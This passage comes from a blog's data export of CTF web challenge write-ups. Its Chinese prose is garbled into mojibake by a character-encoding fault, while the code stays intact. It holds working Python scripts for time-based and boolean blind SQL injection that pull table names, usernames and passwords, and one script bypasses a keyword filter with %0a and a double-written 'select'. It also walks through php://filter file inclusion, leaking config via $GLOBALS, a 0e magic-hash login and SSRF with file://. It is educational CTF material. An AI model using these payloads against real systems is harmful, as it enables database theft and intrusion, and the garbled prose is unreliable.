ï¼šhttps://juejin.im/entry/5c11e35b51882530e46188edï¼‰è¿™é“é¢˜ç›®éš¾åº¦æ˜¾ç„¶è¦é«˜ä¸å°‘ï¼Œä½†ç»™æˆ‘å¾ˆå¤§å¯å‘ã€‚å…¶æ³¨å…¥ç‚¹åœ¨äºåˆ é™¤æ“ä½œä¸­çš„è¯­å¥ 1$result &#x3D; $conn-&gt;query(&quot;delete from note where id&#x3D;$id and user&#x3D;&#39;$user&#39;&quot;); å…¶ä¸­$useræ˜¯å¯æ³¨çš„ã€‚æ‰€ä»¥é‚£é“é¢˜ç›®åœ¨æ‰§è¡Œåˆ é™¤æ“ä½œæ—¶å°±å¯ä»¥è§¦å‘å·²ç»æ³¨å…¥çš„åå­—ï¼Œå¼•èµ·äºŒæ¬¡æ³¨å…¥ã€‚è¿™ä¹Ÿæ˜¯æˆ‘å¼€å§‹å¯¹ç•™è¨€æ¿è¿™é¢˜çš„åˆ¤æ–­ï¼šäºŒæ¬¡æ³¨å…¥ã€‚ä½†æ˜¯å°è¯•æ³¨å†Œæ—¶å‘ç°è¿‡æ»¤çš„å®åœ¨æ˜¯å¤ªå¤šäº†ï¼ŒåŸºæœ¬ä¸å¯èƒ½æ³¨å†Œä¸€ä¸ªsqlè¯­å¥ï¼Œçœ‹æ¥æ˜¯åœ¨å…¶ä»–åœ°æ–¹å¯æ³¨ã€‚ä¹‹ååˆé‡æ–°æ³¨æ„åˆ°ä¸Šé¢æåˆ°çš„åˆ é™¤è¯­å¥ï¼Œå‘ç°ä¸€ä»¶äº‹ï¼Œå½“æˆ‘åœ¨burpé‡Œä¸æ”¹å˜delete_idé‡å¤å‘åŒ…æ—¶ï¼Œç»“æœéƒ½æ˜¾ç¤ºçš„åˆ é™¤æˆåŠŸã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ“ä½œå¹¶æ²¡æœ‰çœŸæ­£åˆ æ‰æˆ‘ä»¬çš„è¯­å¥ã€‚ä»”ç»†FUZZçš„è¯ï¼Œå‘ç°åªè¦idä¼ æ•°å­—ï¼Œä»»ä½•æ•°å­—éƒ½ä¸ä¼šæŠ¥é”™ã€‚åˆ¤æ–­æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚ä½†æ˜¯å›æ˜¾å°±å¾ˆéš¾å—äº†ï¼Œå°è¯• 1delete_id&#x3D;1 and 1&#x3D;1 1delete_id&#x3D;1 and 1&#x3D;2 çš„å›æ˜¾éƒ½æ˜¯åˆ é™¤æˆåŠŸã€‚è¿™å°±ä¸å¤ªå¦™äº†ã€‚è€Œä¸”ç»è¿‡FUZZåå¹¶æ²¡æœ‰è¿‡æ»¤æ‰å…³é”®å­—ã€‚åªèƒ½å°è¯•ç›²æ³¨ï¼Œè€Œä¸”æ˜¯æ—¶é—´ç›²æ³¨ã€‚è¿™é‡Œåæ§½ä¸‹é¢˜ç›®ï¼Œè‡ªå·±åšæ—¶é¢˜ç›®çš„idå·²ç»äº”åƒå¤šï¼Œåˆ é™¤æ“ä½œæ¯æ¬¡éƒ½è´¼å¡ã€‚æˆ‘ç”¨è„šæœ¬æµ‹è¯•æ—¶é—´ç›²æ³¨æœ€ç®€å•çš„è¯­å¥ 1delete_id&#x3D;if(length(database())&lt;100,sleep(5),1) éƒ½æ²¡æœ‰å»¶è¿Ÿï¼Œä¸€åº¦è®©æˆ‘æ€€ç–‘è¿™ä¸ªå‚æ•°æ˜¯å¦å¯æ³¨äº†ã€‚ç„¶è€ŒåŒæ ·çš„payloadç¬¬äºŒå¤©æ—©ä¸Šè·‘(ä¼°è®¡å› ä¸ºåšé¢˜çš„äººè¿™æ—¶å€™å¹¶ä¸å¤š)å°±æµ‹å‡ºæœ‰å»¶æ—¶ã€‚éš¾å—ï¼Œæµªè´¹äº†æˆ‘å¥½é•¿æ—¶é—´è‡ªæˆ‘æ€€ç–‘ã€‚æ‰€ä»¥è´´ä¸‹è„šæœ¬å§ï¼Œé¢˜ç›®å¯¹å…³é”®å­—å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œå”¯ä¸€çš„é—®é¢˜å°±æ˜¯ç¯å¢ƒä¸å¥½ï¼Œæ¯æ¬¡è·‘éƒ½è·‘ä¸å‡ºå®Œæ•´ç»“æœã€‚åªæœ‰æœ€åä¸€æ¬¡å«å‡ºé¢˜äººé‡å¯ç¯å¢ƒæ—¶æ‰æˆåŠŸè·‘å‡ºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚ 123456789101112131415161718192021222324import requestsflag=''cookies=&#123; 'PHPSESSID':'f9nl4jl987d07pisnq508o1kg7'&#125;for i in range(1,40): print(i) for j in range(32,128): url = \"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select group_concat(password) from user),\"+str(i)+\",1))=\"+str(j)+\",sleep(10),1)\" #if(length(database())=\"+str(i)+\",sleep(6),1)\" 7 #if(ascii(substr(database(),1,1))=\"+str(i)+\",sleep(6),1) babysql #if(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) messages , user #if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='messages'),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) message-id ,user-id,message #if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) id, name,password #if(ascii(substr((select group_concat(name) from user),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) cosmos, # if(ascii(substr((select group_concat(password) from user),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) f1FXOCnj26Fkadzt4Sqynf6O7CgR try: result = requests.get(url, cookies=cookies, timeout=10) except requests.exceptions.ReadTimeout: flag+=chr(j) print(flag) break å¼€å§‹éƒ½æ˜¯sleep(6)ä¹Ÿèƒ½æ³¨,åæ¥ä¸å¾—ä¸è°ƒæ•´åˆ°sleep(10)æ‰å¥½è½¬äº†ã€‚æ€»ä¹‹é¢˜ç›®æ˜¯æ¯”è¾ƒåŸºæœ¬çš„æ—¶é—´ç›²æ³¨ï¼Œä½†æˆ‘ä¼°è®¡å¾ˆå¤šäººå› ä¸ºç¯å¢ƒæœ¬æ¥å¯ä»¥åšçš„æœ€åéƒ½ä¸å¾—ä¸æ”¾å¼ƒã€‚æœ€åæ˜¯æ³¨å‡ºuserè¡¨é‡Œçš„cosmosè·Ÿå¯†ç ï¼Œç™»å½•å³å¯ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"æ­ç”µhgame-week2","slug":"æ­ç”µhgame-week2","date":"2020-01-31T02:57:30.000Z","updated":"2021-02-18T05:08:34.640Z","comments":true,"path":"2020/01/31/æ­ç”µhgame-week2/","link":"","permalink":"https://www.bycsec.top/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/","excerpt":"ç¬¬äºŒå‘¨çš„é¢˜ç›®æ˜æ˜¾éš¾åº¦æå‡äº†äº›è®¸ï¼Œä¸è¿‡ç¨å¾®èŠ±ç‚¹æ—¶é—´è¿˜æ˜¯èƒ½åšçš„ã€‚å› ä¸ºæ—¶é—´åŸå› åªåšäº†webï¼Œä½†æ˜¯èƒ½akæ‰webå·²ç»ç®—ä¸é”™äº†hhhã€‚å¸Œæœ›åœ¨åé¢ä¸¤ä¸ªweekè¿˜èƒ½ç»§ç»­å¦‚æ­¤å§ã€‚å…¶ä¸­å› ä¸ºç¬¬å››é“é¢˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ï¼Œå¹²è„†æ€»ç»“ä¸‹åšé¢˜ç»éªŒé¡ºä¾¿å½“å­¦ä¹ ç¬”è®°å†™å†™ã€‚","text":"ç¬¬äºŒå‘¨çš„é¢˜ç›®æ˜æ˜¾éš¾åº¦æå‡äº†äº›è®¸ï¼Œä¸è¿‡ç¨å¾®èŠ±ç‚¹æ—¶é—´è¿˜æ˜¯èƒ½åšçš„ã€‚å› ä¸ºæ—¶é—´åŸå› åªåšäº†webï¼Œä½†æ˜¯èƒ½akæ‰webå·²ç»ç®—ä¸é”™äº†hhhã€‚å¸Œæœ›åœ¨åé¢ä¸¤ä¸ªweekè¿˜èƒ½ç»§ç»­å¦‚æ­¤å§ã€‚å…¶ä¸­å› ä¸ºç¬¬å››é“é¢˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ï¼Œå¹²è„†æ€»ç»“ä¸‹åšé¢˜ç»éªŒé¡ºä¾¿å½“å­¦ä¹ ç¬”è®°å†™å†™ã€‚ Cosmosçš„åšå®¢åå°ä¸ªäººè§‰å¾—è¿™é“é¢˜å‡ºçš„æŒºä¸é”™çš„ã€‚è‡³å°‘æŠŠæˆ‘ä¹‹å‰æ·¡å¿˜çš„å‡ ä¸ªçŸ¥è¯†ç‚¹éƒ½æ•´åˆåˆ°ä¸€èµ·ã€‚ä¹Ÿé¡ºä¾¿æé†’äº†æˆ‘æ¥ä¸‹æ¥çš„å­¦ä¹ ç¬”è®°è¦å†™å•¥hhhã€‚ é¦–å…ˆè¿›å»ä¸€ä¸ªç™»é™†æ¡†ã€‚ç¬¬ä¸€ååº”å½“ç„¶æ˜¯sqlæ³¨å…¥ã€‚ä½†æ˜¯å›æ˜¾å¾ˆæœ‰æ„æ€ã€‚ è¿™ä¸ªâ€œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€å›æ˜¾ç›´æ¥å¦å®šäº†æˆ‘ä»¬ä»»ä½•å…³äºsqlæ³¨å…¥çš„å¯èƒ½ã€‚åŠ ä¸Šæ²¡ä»€ä¹ˆéšè—ä¿¡æ¯ï¼Œå¯¼è‡´æˆ‘å½“æ—¶è¿™é¢˜å°±å…ˆæ”¾ç€å»åšç¬¬äºŒé“äº†ã€‚ä¹‹åå›è¿‡å¤´çœ‹æ—¶ï¼Œæ‰æƒ³èµ·æ¥è¦æŠ“ä¸ªåŒ…ã€‚äºæ˜¯å‘ç°å­˜åœ¨ä¸€ä¸ªè·³è½¬ çœ‹åˆ°actionå°±ç«‹é©¬æœ‰äº†æ–°æ€è·¯ã€‚å› ä¸ºè¿™æ­£æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨çš„å¿…å¤‡å‚æ•°ã€‚é‚£ä¹ˆå°±è¯•è¯•è¯»æ–‡ä»¶å§ã€‚æœæ–­å°è¯•ä¼ªåè®®ã€‚ 1?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php è¿™é‡Œè‡ªå·±è¢«è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« å‘åˆ°äº†â€¦â€¦åŸæ¥ä¸€æ—¶å…´èµ·å†™äº†ä¸ªâ€œä¼ªåè®®æ€»èƒ½ç»™ä½ æƒŠå–œâ€ï¼Œç»“æœæ–‡ç« é‡Œæ³¨é‡php://inputï¼Œä½†æ²¡æœ‰å‘ç°php://filterè¯»æ–‡ä»¶çš„payloadå†™é”™äº†â€¦..è‡ªå·±æœ‰ç‚¹æ·¡å¿˜å°±æ‹¿æ–‡ç« é‡Œçš„payloadå¤åˆ¶ç²˜è´´ï¼Œç»“æœåŠå¤©ä¸å‡ºç»“æœã€‚åæ¥æ‰å‘ç°è‡ªå·±å†™é”™äº†ã€‚æ€»ä¹‹è¯»åˆ°æºç ,base64è§£ç åï¼šindex.php 1234567891011121314151617181920212223&lt;?phperror_reporting(0);session_start();if(isset($_SESSION['username'])) &#123; header(\"Location: admin.php\"); exit();&#125;$action = @$_GET['action'];$filter = \"/config|etc|flag/i\";if (isset($_GET['action']) &amp;&amp; !empty($_GET['action'])) &#123; if(preg_match($filter, $_GET['action'])) &#123; echo \"Hacker get out!\"; exit(); &#125; include $action;&#125;elseif(!isset($_GET['action']) || empty($_GET['action'])) &#123; header(\"Location: ?action=login.php\"); exit();&#125; å‘ç°admin.phpçš„å­˜åœ¨ï¼Œä»¥åŠlogin.phpå¯èƒ½å­˜åœ¨çŒ«è…»ã€‚ é‚£ä¹Ÿç”¨ä¼ªåè®®è¯»ä¸‹login.php 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude \"config.php\";session_start();//Only for debugif (DEBUG_MODE)&#123; if(isset($_GET['debug'])) &#123; $debug = $_GET['debug']; if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) &#123; die(\"args error!\"); &#125; eval(\"var_dump($$debug);\"); &#125;&#125;if(isset($_SESSION['username'])) &#123; header(\"Location: admin.php\"); exit();&#125;else &#123; if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; if ($admin_password == md5($_POST['password']) &amp;&amp; $_POST['username'] === $admin_username)&#123; $_SESSION['username'] = $_POST['username']; header(\"Location: admin.php\"); exit(); &#125; else &#123; echo \"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\"; &#125; &#125;&#125;?&gt;#htmléƒ¨åˆ†ç•¥ admin.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude \"config.php\";session_start();if(!isset($_SESSION['username'])) &#123; header('Location: index.php'); exit();&#125;function insert_img() &#123; if (isset($_POST['img_url'])) &#123; $img_url = @$_POST['img_url']; $url_array = parse_url($img_url); if (@$url_array['host'] !== \"localhost\" &amp;&amp; $url_array['host'] !== \"timgsa.baidu.com\") &#123; return false; &#125; $c = curl_init(); curl_setopt($c, CURLOPT_URL, $img_url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($c); curl_close($c); $avatar = base64_encode($res); if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123; return $avatar; &#125; &#125; else &#123; return base64_encode(file_get_contents(\"static/logo.png\")); &#125;&#125;?&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Cosmos'Blog - åå°ç®¡ç†&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=\"logout.php\"&gt;é€€å‡ºç™»é™†&lt;/a&gt; &lt;div style=\"text-align: center;\"&gt; &lt;h1&gt;Welcome &lt;?php echo $_SESSION['username'];?&gt; &lt;/h1&gt; &lt;/div&gt; &lt;form action=\"\" method=\"post\"&gt; &lt;fieldset style=\"width: 30%;height: 20%;float:left\"&gt; &lt;legend&gt;æ’å…¥å›¾ç‰‡&lt;/legend&gt; &lt;p&gt;&lt;label&gt;å›¾ç‰‡url: &lt;input type=\"text\" name=\"img_url\" placeholder=\"\"&gt;&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;button type=\"submit\" name=\"submit\"&gt;æ’å…¥&lt;/button&gt;&lt;/p&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;fieldset style=\"width: 30%;height: 20%;float:left\"&gt; &lt;legend&gt;è¯„è®ºç®¡ç†&lt;/legend&gt; &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt; &lt;/fieldset&gt; &lt;fieldset style=\"width: 30%;height: 20%;\"&gt; &lt;legend&gt;æ–‡ç« åˆ—è¡¨&lt;/legend&gt; &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt; &lt;/fieldset&gt; &lt;fieldset style=\"height: 50%\"&gt; &lt;div style=\"text-align: center;\"&gt; &lt;img height='200' width='500' src='data:image/jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(\"static/error.jpg\")); ?&gt;'&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;/body&gt;&lt;/html&gt; é‚£ä¹ˆä¸éš¾å‘ç°å‡ ä¸ªæºç é‡Œçš„è¦ç‚¹ï¼šindex.phpä¸­ï¼šbanæ‰äº†flagä¸configã€‚è€Œåé¢å¯ä»¥æ³¨æ„åˆ°config.phpè¢«admin.phpä¸login.phpåŒ…å«(include)äº†ã€‚ login.phpä¸­1.å­˜åœ¨ä¸€ä¸ªå‚æ•°debug,ä»¥åŠå¯¹è¿™å‚æ•°çš„eval()ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªå¯æ§å¯æ‰§è¡Œçš„å‚æ•°ï¼Œä½†æ˜¯è¦ç»•æ­£åˆ™ã€‚2.ç¨å¾®æ³¨æ„ä¸‹ï¼Œç™»å½•æ—¶usernameä»¥åŠpasswordå‡éœ€ä¸å¯¹åº”çš„å‚æ•°ï¼ˆè‚¯å®šåœ¨config.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å¯èƒ½é€šè¿‡å…¶ä»–é€”å¾„ç™»å½•ï¼‰ç›¸ç­‰ã€‚ä½†æ˜¯passwordååæ˜¯==çš„å¼±ç±»å‹ç›¸ç­‰ã€‚è¿™å°±ä»£è¡¨passwordä¸€å®šä¼šæœ‰æ¼æ´ã€‚ä¸”ç”šè‡³å¯ä»¥çŒœåˆ°ï¼Œpasswordçš„md5å€¼å¼€å¤´æ˜¯0eã€‚è¿™æ ·æ‰ä¼šæœ‰å¼±ç±»å‹æ¯”è¾ƒæ¼æ´åˆ©ç”¨ã€‚ admin.phpä¸­1.ä¸‹é¢ä¸€æ®µä»£ç  123456$c = curl_init();curl_setopt($c, CURLOPT_URL, $img_url);curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);$res = curl_exec($c);curl_close($c);$avatar = base64_encode($res); æœ‰ç‚¹çœ¼ç†Ÿï¼Œå†åŠ ä¸Šå‰é¢ä¸€æ®µå¯¹hostçš„åˆ¤åˆ«ï¼Œå¯ä»¥æƒ³è§æ˜¯å­˜åœ¨ssrfæ¼æ´ã€‚ï¼ˆè™½ç„¶æˆ‘ä¸ç†Ÿï¼‰ç™¾åº¦ä¸€ä¸‹ï¼Œå‘ç°è¿™æœç„¶æ˜¯ssrfæ¼æ´çš„ç»å…¸ä»£ç ã€‚ä¹Ÿæé†’äº†æˆ‘è¦å‡†å¤‡å­¦ä¹ ssrfçš„ç¬”è®°äº†â€¦â€¦ ç„¶åå°±æ˜¯å­˜åœ¨ä¸€ä¸ªå›¾ç‰‡æ’å…¥çš„åŠŸèƒ½ã€‚è€Œä¸”å®ƒä¼šè¿”å›base64ç¼–ç åçš„file_get_contents()ç»“æœã€‚è¿™ä¹Ÿæ˜¯ssrfåˆ©ç”¨ä¸­èƒ½æ‹¿åˆ°å›æ˜¾ç»“æœçš„é‡è¦ç»†èŠ‚ã€‚ æ‰€ä»¥æ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œä»login.phpä¸‹æ‰‹ï¼Œç™»å½•åå°ï¼Œåˆ©ç”¨ssrfæ‹¿åˆ°æ ¹ç›®å½•ä¸‹çš„flagã€‚ é¦–å…ˆæ˜¯å…³äºdebugå‚æ•°çš„åˆ©ç”¨äº†ã€‚ 1234if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) &#123; die(\"args error!\"); &#125; eval(\"var_dump($$debug);\"); ä¸»è¦æ˜¯è¿™æ®µä»£ç ï¼Œè‡ªå·±å¼€å§‹åªç†è§£æˆè¿‡æ»¤äº†ä¸€å †ä¸œè¥¿â€¦â€¦åæ¥ç™¾åº¦ä¸‹ï¼Œçªç„¶æƒ³èµ·æ¥åŸæ¥ichunqiuä¸Šåšè¿‡çš„ä¸€é“é¢˜ã€‚å«åšçˆ†ç ´-1ã€‚ä½†å®é™…ä¸Šæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡çš„åˆ©ç”¨ï¼ˆå› ä¸ºå®ƒincludeäº†flag.php,æ‰€ä»¥ä¼ å‚globalså°±èƒ½é€šè¿‡eval($$a)æ‹¿flagï¼‰ã€‚è€Œè¿™é¢˜åŒæ ·ä¹Ÿincludeäº†config.phpâ€¦â€¦å›è¿‡å¤´çœ‹æ­£åˆ™ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªæ­£åˆ™å…¶å®æ°å¥½é™å®šäº†ä¼ å‚ä¸ºå˜é‡åã€‚å…·ä½“å‚è€ƒstackoverflowï¼šhttps://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-phpå®ƒè¦æ±‚å¼€å¤´ç¬¬ä¸€ä¸ªå­—æ¯å¯ä»¥æ˜¯å­—æ¯ä¸‹åˆ’çº¿åŠä¸å¯è§å­—ç¬¦ï¼Œåé¢å…¶ä»–å­—æ¯å¯ä»¥æ˜¯å­—æ¯æ•°å­—åŠä¸å¯è§å­—ç¬¦ã€‚ï¼ˆ\\x7f-\\xff ç¡®åˆ‡çš„è¯´ï¼Œå¯ä»¥åŒ¹é…utf-8ç¼–ç ä¸­çš„éasciiç¼–ç å­—ç¬¦ï¼‰ã€‚æ€»ä¹‹ç¡®å®šå¯ä»¥ä¼ å‚æ•°åï¼Œæˆ‘ä»¬è¯•è¯•GLOBALSç›´æ¥æ‹¿åˆ°ç”¨æˆ·åCosmos!ï¼Œä»¥åŠå¯†ç æ˜¯0eå¼€å¤´çš„äº‹å®ã€‚æ•…é€‰ä¸ª0eå¼€å¤´MD5çš„å­—ç¬¦ä¸²ç™»å½•è¿›å»ã€‚ 12Cosmos!s878926199a è¿›å»åæˆ‘ä¹Ÿå¡äº†å¥½ä¹…â€¦â€¦ssrfä¸ç†Ÿï¼Œåªèƒ½ç›²ç›®çš„è¯•ã€‚èƒ½ç¡®å®šçš„æ˜¯éœ€è¦hostè¢«è§£æä¸ºlocalhost,å°è¯•ç›´æ¥http://localhostä½†æ˜¯å›æ˜¾æ€»æ˜¯é‚£å¼ æŠ¥é”™çš„å›¾ã€‚å”¯ä¸€ä¸åŒçš„åœ¨äºï¼Œå½“æˆ‘å°è¯•http://localhost/flagæ—¶ï¼Œè¿”å›çš„æ˜¯404,ä¹Ÿå°±æ˜¯è¯´curlæˆåŠŸæ‰§è¡Œäº†ã€‚æ‰€ä»¥è¯´ï¼Œflagåº”è¯¥æ˜¯åœ¨æœåŠ¡å™¨æ ¹ç›®å½•ï¼Œä¸æ˜¯ç½‘ç«™æ ¹ç›®å½•ã€‚é—®é¢˜å˜ä¸ºæ€ä¹ˆè¯»äº†ã€‚åœ¨æŸ¥é˜…èµ„æ–™æ—¶çªç„¶æ³¨æ„åˆ°fileåè®®å¯ä»¥è¯»æ–‡ä»¶ã€‚äºæ˜¯æ¢ä¸‹file://åè®®å±…ç„¶æˆäº†ã€‚ã€‚ã€‚è§£ç å¯æ‹¿åˆ°flagã€‚åæ¥éƒå¸ˆå‚…è§£é‡Šè¯´ï¼Œå› ä¸ºindex.phpå­˜åœ¨302ï¼Œcurlä¸èƒ½è·Ÿéšï¼Œè·å–æ˜¯ç©ºçš„ã€‚ç»“åˆæºç ä¸­è·å–ä¸ºç©ºåˆ™è¿”å›é”™è¯¯å›¾ç‰‡è¿™ç‚¹ï¼Œå°±æ˜ç™½äº†ä¸ºä»€ä¹ˆhttp://localhostæ€»æ˜¯æ²¡ç»“æœä½†æˆ‘ä¼°è®¡è¿˜æœ‰å…¶ä»–æ–¹æ³•åšï¼Œè¿™é‡Œé©¬ä¸€æ‰‹ã€‚ Cosmosçš„ç•™è¨€æ¿-1è¯´æ¥æƒ­æ„§ï¼Œè¿™é¢˜å¼€å§‹æˆ‘ipåˆè¢«banäº†hhhhã€‚å¥½åœ¨è²Œä¼¼æ˜¯é¢˜ç›®é—®é¢˜ï¼Œåæ¥å‡ºé¢˜äººè°ƒæ•´äº†å°±å¥½äº†ã€‚é¦–å…ˆæ ¹æ®FUZZå¯ä»¥ç¡®è®¤å­˜åœ¨sqlæ³¨å…¥ã€‚è¾“å…¥1å›æ˜¾æ­£å¸¸ï¼Œè¾“å…¥1&#39;æ— å›æ˜¾ã€‚è¾“å…¥1&quot;å›æ˜¾æ­£å¸¸ã€‚é‚£ä¹ˆæ˜¾ç„¶ï¼Œè¿™æ˜¯ç›²æ³¨çš„å‘³é“ã€‚å› ä¸ºåªæœ‰æ­£ç¡®é”™è¯¯ä¸¤ç§å›æ˜¾æ–¹å¼ï¼Œæ‰€ä»¥ç¡®è®¤æ˜¯å¸ƒå°”ç›²æ³¨ã€‚ ç„¶åfuzzäº†ä¸‹banæ‰çš„å…³é”®å­—ï¼šç©ºæ ¼ï¼Œå¯ä»¥ç”¨%0aæ›¿ä»£ 1select å…³é”®å­—å¯ä»¥åŒå†™ç»•è¿‡ é‚£ä¸å¤šè¯´ç›´æ¥æ”¾ç›²æ³¨è„šæœ¬äº†ã€‚æ•´ä½“è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼ˆä¹‹å‰æ€»ç»“çš„æ¨¡æ¿ç›´æ¥æ‹¿æ¥å¥—hhhï¼‰ï¼š 12345678910111213141516import requestsflag=''#hgame&#123;w0w_sql_InjeCti0n_Is_S0_IntereSting!!&#125;for i in range(1,50): a=0 print(i) for j in range(32,128): payload=\"http://139.199.182.61/index.php?id=1'and%0aascii(substr((selselectect%0afl4444444g%0afrom%0af1aggggggggggggg),\"+str(i)+\",1))=\"+str(j)+\"%23\" #print(payloadï¼‰ res=requests.get(url=payload) if 'Hello' in res.text: flag+=chr(j) print(flag) a=1 if a==0: break Cosmosçš„æ–°è¯­è¨€è¿™é“é¢˜ç¡®åˆ‡è¯´ä¸ç®—éš¾é¢˜å§ã€‚ä½†æ˜¯è‡ªå·±ä»ç„¶è€—è´¹äº†2ä¸ªå¤šå°æ—¶åœ¨è¿™ä¸Šé¢ï¼Œæ„Ÿè§‰æŒºåˆ’ä¸æ¥çš„â€¦â€¦ è¯ä¸å¤šè¯´ï¼Œå…ˆçœ‹é¢˜ç›® åˆå§‹è¿›å»å‘ç°æœ‰æºç åŠå›æ˜¾ã€‚æºç å¾ˆç®€æ´ï¼Œå…³é”®åœ¨äºfile_get_contents(&#39;mycode&#39;);å¼€å§‹ä¹ æƒ¯æ€§ä»¥ä¸ºæ˜¯file_get_contents()çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ä½†æ˜¯ä»”ç»†çœ‹ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å¯æ§å‚æ•°ã€‚å› ä¸ºè¿™é‡Œçš„&#39;mycode&#39;æŒ‡ä»£çš„å…¶å®æ˜¯filename,å¦‚æœæœ‰ç–‘é—®ï¼Œé‚£ä¹ˆä¸å¦¨æ”¾åˆ°phpä¸­çœ‹çœ‹ä¹Ÿå°±æ˜¯è¯´ï¼Œmycodeæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”å›æ˜¾çš„ä¸çŸ¥åå†…å®¹ä¹Ÿæ˜¯mycodeé‡Œé¢çš„ã€‚ å›æ˜¾å°±ä¸ç®€å•äº†ï¼Œçœ‹ä¼¼æ˜¯base64ï¼Œä½†è§£ç åä»ç„¶æ˜¯æœªçŸ¥ç¼–ç ã€‚é‚£ä¹ˆæˆ‘ä»¬ä»mycodeä¸‹æ‰‹ã€‚ç”±æºç å¯çŸ¥ï¼Œmycodeåº”è¯¥æ˜¯è·Ÿindex.phpåœ¨åŒä¸€ä¸ªç›®å½•ä¸‹çš„ï¼Œæ•…è®¿é—®ä¹‹ã€‚å¾—åˆ°æºç å¯ä»¥çŸ¥é“ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œå¹¶å¯¹$_SERVER[&#39;token&#39;]è¿›è¡Œäº†å¤šé‡ç¼–ç ã€‚åªè¦æˆ‘ä»¬postçš„tokenä¸æœåŠ¡å™¨çš„tokenç›¸åŒå³å¯æ‹¿åˆ°flagã€‚ å¼€å§‹æˆ‘æƒ³ï¼Œè¿™ä¸æ˜¯å¾ˆç®€å•å—ï¼ŒæŠŠç¼–ç å€’è¿‡æ¥è§£ç ä¸å°±å¥½äº†ï¼Ÿä½†æ˜¯è§£å‡ºtokenåå‘ç°æ²¡æœ‰æ‹¿åˆ°flagï¼Œä»”ç»†å›åˆ°åŸé¡µé¢ï¼Œå‘ç°ä¸€ä¸ªå¤§é—®é¢˜ï¼šmycodeä¸­ç”¨äºåŠ å¯†$_SERVER[&#39;token&#39;]çš„æºç æ˜¯å˜åŒ–çš„ã€‚å”¯ä¸€ä¸å˜çš„æ˜¯åŠ å¯†å‡½æ•°çš„æ•°é‡æ€»æ˜¯10ä¸ªï¼Œè€ŒåŠ å¯†å‡½æ•°çš„ç§ç±»åªæœ‰encrypt(),base64_encode(),strrev(),str_rot13()è€Œè¿™ä½“ç°åœ¨index.phpä¸Šå›æ˜¾çš„å†…å®¹ä¹Ÿæ˜¯ä¸æ–­å˜æ¢çš„ã€‚ä¸”åŸºæœ¬ä¸Šå‡ ç§’é’Ÿå°±æ¢æ‰äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªèƒ½é è„šæœ¬è§£å†³ï¼Œè€Œä¸å¯èƒ½äººæ‰‹è§£å†³ã€‚(å½“ç„¶ï¼Œä¹Ÿè®¸å¯ä»¥æŠŠå‡ ç§å­¤é›¶é›¶çš„åŠ å¯†é¡ºåºçš„å¯èƒ½æ€§ä¸æ–­è¯•ä¹Ÿè®¸åˆšå¥½ç¢°å¯¹äº†ã€‚ä½†è¿™æ— å¼‚äºå¤§æµ·æé’ˆï¼Œå°±æ²¡æœ‰æ„ä¹‰äº†ã€‚) 